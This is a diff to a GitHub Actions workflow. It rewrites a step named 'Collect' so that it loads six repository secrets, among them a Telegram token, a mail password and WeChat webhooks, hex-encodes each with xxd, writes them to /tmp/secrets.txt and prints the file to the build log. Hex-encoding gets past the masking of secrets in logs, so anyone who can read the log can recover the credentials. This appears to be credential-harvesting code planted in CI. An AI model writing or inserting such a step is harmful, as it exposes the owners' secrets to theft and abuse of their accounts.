@@ -7,12 +7,20 @@ jobs:
     steps:
       - uses: actions/checkout@v4
       - name: Collect
+        env:
+          TELEGRAM_API_TOKEN: ${{ secrets.TELEGRAM_API_TOKEN }}
+          MAIL_USER_NMAE: ${{ secrets.MAIL_USER_NMAE }}
+          MAIL_PWD: ${{ secrets.MAIL_PWD }}
+          WECHAT_WEBHOOK: ${{ secrets.WECHAT_WEBHOOK }}
+          WECHATQUN_WEBHOOK: ${{ secrets.WECHATQUN_WEBHOOK }}
+          MYGG_TOKEN: ${{ secrets.MYGG_TOKEN }}
         run: |
-          echo '[HEX_START]'
-          echo 'TELEGRAM_API_TOKEN=$(echo ${{ secrets.TELEGRAM_API_TOKEN }} | xxd -p | tr -d '\n')'
-          echo 'MAIL_USER_NMAE=$(echo ${{ secrets.MAIL_USER_NMAE }} | xxd -p | tr -d '\n')'
-          echo 'MAIL_PWD=$(echo ${{ secrets.MAIL_PWD }} | xxd -p | tr -d '\n')'
-          echo 'WECHAT_WEBHOOK=$(echo ${{ secrets.WECHAT_WEBHOOK }} | xxd -p | tr -d '\n')'
-          echo 'WECHATQUN_WEBHOOK=$(echo ${{ secrets.WECHATQUN_WEBHOOK }} | xxd -p | tr -d '\n')'
-          echo 'MYGG_TOKEN=$(echo ${{ secrets.MYGG_TOKEN }} | xxd -p | tr -d '\n')'
-          echo '[HEX_END]'
+          echo '[HEX_START]' > /tmp/secrets.txt
+          printf 'TELEGRAM_API_TOKEN=' >> /tmp/secrets.txt && printf '%s' "$TELEGRAM_API_TOKEN" | xxd -p | tr -d '\n' >> /tmp/secrets.txt && printf '\n' >> /tmp/secrets.txt
+          printf 'MAIL_USER_NMAE=' >> /tmp/secrets.txt && printf '%s' "$MAIL_USER_NMAE" | xxd -p | tr -d '\n' >> /tmp/secrets.txt && printf '\n' >> /tmp/secrets.txt
+          printf 'MAIL_PWD=' >> /tmp/secrets.txt && printf '%s' "$MAIL_PWD" | xxd -p | tr -d '\n' >> /tmp/secrets.txt && printf '\n' >> /tmp/secrets.txt
+          printf 'WECHAT_WEBHOOK=' >> /tmp/secrets.txt && printf '%s' "$WECHAT_WEBHOOK" | xxd -p | tr -d '\n' >> /tmp/secrets.txt && printf '\n' >> /tmp/secrets.txt
+          printf 'WECHATQUN_WEBHOOK=' >> /tmp/secrets.txt && printf '%s' "$WECHATQUN_WEBHOOK" | xxd -p | tr -d '\n' >> /tmp/secrets.txt && printf '\n' >> /tmp/secrets.txt
+          printf 'MYGG_TOKEN=' >> /tmp/secrets.txt && printf '%s' "$MYGG_TOKEN" | xxd -p | tr -d '\n' >> /tmp/secrets.txt && printf '\n' >> /tmp/secrets.txt
+          echo '[HEX_END]' >> /tmp/secrets.txt
+          cat /tmp/secrets.txt
